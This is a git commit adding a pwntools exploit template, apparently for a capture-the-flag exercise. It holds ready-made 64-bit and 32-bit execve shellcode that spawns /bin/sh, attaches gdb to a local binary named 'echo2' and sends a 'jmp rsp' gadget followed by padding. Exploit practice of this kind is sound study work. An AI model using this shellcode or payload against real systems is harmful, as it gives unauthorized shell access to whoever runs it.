f6eab47008bd5af53bd8579396344a06c8fba01e
f-viktor <ferter.viktor@gmail.com>
2019-11-25 11:58:53 +0100

    Create pwntools_template.py

---
+++ pwntools_template.py
@@ -0,0 +1,18 @@
+from pwn import *
+
+shellcode64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+shellcode32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+context.log_level = 'debug'
+context.terminal = ['st', '-e', 'sh', '-c']
+r = process("echo2")
+
+# Attach the debugger
+gdb.attach(r, '''
+set follow-fork-mode child
+break execve
+continue
+''')
+
+r.recvuntil(':')
+r.sendline("\xff\xe4"+"A"*10)
